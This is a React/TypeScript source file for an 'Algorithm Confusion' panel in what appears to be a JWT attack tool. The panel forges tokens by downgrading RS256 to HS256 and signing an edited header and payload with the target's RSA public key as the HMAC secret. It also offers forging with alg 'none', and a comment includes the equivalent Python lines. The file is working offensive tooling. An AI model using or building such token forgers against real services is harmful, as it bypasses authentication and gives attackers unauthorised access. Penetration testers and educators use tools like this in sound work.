import { useState, useCallback, useEffect } from 'react'
import { motion } from 'framer-motion'
import { useJWTState } from '../../../context/JWTContext'
import { useForgedToken } from '../../../hooks/useForgedToken'
import { JsonEditor } from '../../shared/JsonEditor'
import { KeyUpload } from '../../shared/KeyUpload'
import { OutputToken } from '../../shared/OutputToken'
import { AlgorithmSelector } from '../../shared/AlgorithmSelector'
import type { JwtAlgorithm } from '../../../types/jwt.types'

export function AlgConfusionPanel() {
  const { decoded } = useJWTState()
  const {
    modifiedHeader, modifiedPayload, signingAlgorithm,
    forgedToken, forgeError, isForging,
    forgeToken, setModifiedHeader, setModifiedPayload, setSigningAlgorithm,
  } = useForgedToken()

  const [pemContent, setPemContent] = useState('')
  const [pemError, setPemError] = useState<string | null>(null)
  const [pemKeyInfo, setPemKeyInfo] = useState<string | null>(null)

  const originalAlg = decoded?.header.json?.alg as string | undefined
  const isRSx = originalAlg?.startsWith('RS') || originalAlg?.startsWith('PS')

  // Auto-detect RS256 → suggest HS256
  useEffect(() => {
    if (isRSx && signingAlgorithm.startsWith('RS')) {
      setSigningAlgorithm('HS256')
      if (modifiedHeader) {
        setModifiedHeader({ ...modifiedHeader, alg: 'HS256' })
      }
    }
  }, [isRSx])

  const handlePemLoaded = useCallback((pem: string) => {
    setPemContent(pem)
    setPemError(null)

    // Quick check if it looks like a PEM
    if (!pem.includes('-----BEGIN')) {
      setPemError('Not a valid PEM file')
      setPemKeyInfo(null)
      return
    }

    if (pem.includes('PRIVATE KEY')) {
      setPemError('This is a private key. For algorithm confusion, upload the target\'s PUBLIC key.')
      setPemKeyInfo(null)
      return
    }

    if (pem.includes('PUBLIC KEY')) {
      setPemKeyInfo('✅ RSA public key loaded — will be used as HMAC secret')
      setPemError(null)
    } else {
      setPemError('Unknown PEM format. Expected a PUBLIC KEY.')
      setPemKeyInfo(null)
    }
  }, [])

  const handleForge = useCallback(async () => {
    // For 'none' algorithm, no key needed
    if (signingAlgorithm === 'none') {
      await forgeToken(null)
      return
    }
    if (!pemContent) return
    // Use the raw PEM bytes as the HMAC secret
    const secret = new TextEncoder().encode(pemContent)
    await forgeToken(secret)
  }, [pemContent, signingAlgorithm, forgeToken])

  const handleAlgChange = useCallback((alg: JwtAlgorithm) => {
    setSigningAlgorithm(alg)
    if (modifiedHeader) {
      setModifiedHeader({ ...modifiedHeader, alg })
    }
  }, [modifiedHeader, setModifiedHeader, setSigningAlgorithm])


  if (!decoded) {
    return <EmptyPanel title="Algorithm Confusion" desc="Paste a JWT token in the Decode tab first." />
  }

  return (
    <motion.div
      initial={{ opacity: 0, y: 8 }}
      animate={{ opacity: 1, y: 0 }}
      style={{
        border: '1px solid var(--border)',
        borderRadius: 'var(--radius-lg)',
        background: 'var(--bg-secondary)',
        overflow: 'hidden',
      }}
    >
      <PanelHeader
        title="Algorithm Confusion"
        desc="Downgrade RS256 → HS256, sign with the target's public key as HMAC secret"
        icon="⇄"
      />

      <div style={{ padding: '16px 18px', display: 'flex', flexDirection: 'column', gap: 16 }}>
        {/* Detection banner */}
        {originalAlg && (
          <div style={{
            padding: '10px 14px',
            borderRadius: 'var(--radius-sm)',
            background: isRSx ? 'var(--success-bg)' : 'var(--danger-bg)',
            border: `1px solid ${isRSx ? 'var(--success)' : 'var(--warning)'}`,
            fontSize: 13,
            color: isRSx ? 'var(--success)' : 'var(--warning)',
            fontFamily: 'var(--mono)',
          }}>
            {isRSx
              ? `🔍 Detected ${originalAlg} → algorithm downgraded to HS256`
              : `⚠ Original algorithm is ${originalAlg || 'unknown'}, not RSA. Algorithm confusion may not apply.`}
          </div>
        )}

        {/* Header/Payload editors */}
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 14 }}>
          <JsonEditor
            label="Modified Header"
            value={modifiedHeader || {}}
            onChange={setModifiedHeader}
          />
          <JsonEditor
            label="Modified Payload"
            value={modifiedPayload || {}}
            onChange={setModifiedPayload}
          />
        </div>

        <AlgorithmSelector
          value={signingAlgorithm}
          onChange={handleAlgChange}
        />

        {/* Key upload */}
        <KeyUpload
          label="Target's RSA Public Key (will be used as HMAC secret)"
          onKeyLoaded={handlePemLoaded}
        />
        {pemKeyInfo && (
          <div style={{ fontSize: 13, color: 'var(--success)', fontFamily: 'var(--mono)' }}>
            {pemKeyInfo}
          </div>
        )}
        {pemError && (
          <div style={{ fontSize: 13, color: 'var(--danger)', fontFamily: 'var(--mono)' }}>
            {pemError}
          </div>
        )}

        {pemContent && pemKeyInfo && (
          <div style={{
            padding: '10px 14px',
            background: 'var(--bg-code)',
            border: '1px solid var(--border)',
            borderRadius: 'var(--radius-md)',
            fontSize: 12,
            color: 'var(--text-muted)',
            fontFamily: 'var(--mono)',
          }}>
            💡 The raw bytes of the PEM file will be used as the HMAC-SHA256 secret.
            This mirrors exactly what the Python script does:
            <code style={{ display: 'block', marginTop: 4, color: 'var(--text-secondary)' }}>
              secret = open("public.pem", "rb").read()<br />
              hmac.new(secret, message, sha256).digest()
            </code>
          </div>
        )}

        {/* Forge button */}
        <ForgeButton
          isForging={isForging}
          canForge={signingAlgorithm === 'none' || !!pemContent}
          onClick={handleForge}
        />

        <OutputToken token={forgedToken} error={forgeError} isForging={isForging} />
      </div>
    </motion.div>
  )
}

// Reusable panel components
function ForgeButton({ isForging, canForge, onClick }: { isForging: boolean; canForge: boolean; onClick: () => void }) {
  return (
    <button
      onClick={onClick}
      disabled={isForging || !canForge}
      style={{
        padding: '10px 24px',
        border: 'none',
        borderRadius: 'var(--radius-md)',
        background: canForge ? 'var(--accent)' : 'var(--bg-tertiary)',
        color: canForge ? '#fff' : 'var(--text-muted)',
        fontWeight: 600,
        fontSize: 14,
        fontFamily: 'var(--sans)',
        cursor: canForge ? 'pointer' : 'not-allowed',
        transition: 'all var(--transition-fast)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        gap: 8,
        width: 'fit-content',
      }}
      onMouseEnter={e => {
        if (canForge) e.currentTarget.style.background = 'var(--accent-hover)'
      }}
      onMouseLeave={e => {
        if (canForge) e.currentTarget.style.background = 'var(--accent)'
      }}
    >
      {isForging ? 'Forging...' : '🔨 Forge Token'}
    </button>
  )
}

function PanelHeader({ title, desc, icon }: { title: string; desc: string; icon: string }) {
  return (
    <div style={{
      padding: '12px 18px',
      borderBottom: '1px solid var(--border)',
      background: 'var(--bg-tertiary)',
      display: 'flex',
      alignItems: 'center',
      gap: 10,
    }}>
      <span style={{ fontSize: 18 }}>{icon}</span>
      <div>
        <div style={{ fontSize: 15, fontWeight: 600 }}>{title}</div>
        <div style={{ fontSize: 12, color: 'var(--text-muted)', marginTop: 1 }}>{desc}</div>
      </div>
    </div>
  )
}

function EmptyPanel({ title, desc }: { title: string; desc: string }) {
  return (
    <motion.div
      initial={{ opacity: 0, y: 8 }}
      animate={{ opacity: 1, y: 0 }}
      style={{
        border: '1px solid var(--border)',
        borderRadius: 'var(--radius-lg)',
        background: 'var(--bg-secondary)',
        overflow: 'hidden',
      }}
    >
      <PanelHeader title={title} desc="" icon="🔒" />
      <div style={{
        padding: '40px 18px',
        textAlign: 'center',
        color: 'var(--text-muted)',
        fontSize: 14,
      }}>
        {desc}
      </div>
    </motion.div>
  )
}
